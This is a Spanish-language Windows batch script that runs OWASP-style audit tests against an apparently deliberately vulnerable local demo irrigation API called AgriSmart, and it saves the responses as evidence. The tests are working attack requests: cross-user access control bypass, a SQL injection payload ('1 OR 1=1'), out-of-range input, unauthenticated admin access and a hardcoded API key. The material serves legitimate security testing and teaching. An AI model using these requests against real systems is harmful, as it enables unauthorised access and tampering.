@echo off
setlocal
cd /d "%~dp0"
set "BASE=http://127.0.0.1:3000"
set "KEY=AGRISMART-DEMO-1234"
set "OUT=auditoria\fase1"
if not exist "%OUT%" mkdir "%OUT%"

echo ================================================
echo  AgriSmart - Auditoria automatica FASE 1
 echo  Version VULNERABLE: %BASE%
echo ================================================
echo.

call :A01
call :A03
call :A04
call :A05
call :A07

echo.
echo ================================================
echo  LISTO: evidencias guardadas en %OUT%
echo ================================================
pause
exit /b

:A01
echo [A01] Broken Access Control...
> "%OUT%\A01.txt" echo PRUEBA A01 - Broken Access Control
>> "%OUT%\A01.txt" echo Objetivo: usuario 1 intenta modificar la zona 2, que pertenece a otro usuario.
>> "%OUT%\A01.txt" echo.
curl.exe -sS --max-time 5 -i -X PUT "%BASE%/api/zones/2/irrigation" -H "x-api-key: %KEY%" -H "x-user-id: 1" -H "Content-Type: application/json" --data "{\"enabled\":false}" >> "%OUT%\A01.txt" 2>&1
type "%OUT%\A01.txt"
echo.
exit /b

:A03
echo [A03] SQL Injection...
> "%OUT%\A03.txt" echo PRUEBA A03 - SQL Injection
>> "%OUT%\A03.txt" echo Objetivo: alterar la consulta usando zone_id=1 OR 1=1.
>> "%OUT%\A03.txt" echo.
curl.exe -sS --max-time 5 -i --get "%BASE%/api/history" -H "x-api-key: %KEY%" -H "x-user-id: 1" --data-urlencode "zone_id=1 OR 1=1" >> "%OUT%\A03.txt" 2>&1
type "%OUT%\A03.txt"
echo.
exit /b

:A04
echo [A04] Insecure Design...
> "%OUT%\A04.txt" echo PRUEBA A04 - Insecure Design
>> "%OUT%\A04.txt" echo Objetivo: enviar umbrales fuera de rango.
>> "%OUT%\A04.txt" echo.
curl.exe -sS --max-time 5 -i -X PUT "%BASE%/api/zones/1/settings" -H "x-api-key: %KEY%" -H "x-user-id: 1" -H "Content-Type: application/json" --data "{\"moisture_threshold\":9999,\"irrigation_minutes\":9999}" >> "%OUT%\A04.txt" 2>&1
type "%OUT%\A04.txt"
echo.
exit /b

:A05
echo [A05] Security Misconfiguration...
> "%OUT%\A05.txt" echo PRUEBA A05 - Security Misconfiguration
>> "%OUT%\A05.txt" echo Objetivo: acceder al panel administrativo sin autenticacion.
>> "%OUT%\A05.txt" echo.
curl.exe -sS --max-time 5 -i "%BASE%/admin/sensors" >> "%OUT%\A05.txt" 2>&1
type "%OUT%\A05.txt"
echo.
exit /b

:A07
echo [A07] Authentication Failure...
> "%OUT%\A07.txt" echo PRUEBA A07 - Hardcoded API Key
>> "%OUT%\A07.txt" echo Objetivo: comprobar si la clave incrustada permite acceso.
>> "%OUT%\A07.txt" echo.
curl.exe -sS --max-time 5 -i "%BASE%/api/sensors" -H "x-api-key: AGRISMART-DEMO-1234" -H "x-user-id: 1" >> "%OUT%\A07.txt" 2>&1
type "%OUT%\A07.txt"
echo.
exit /b
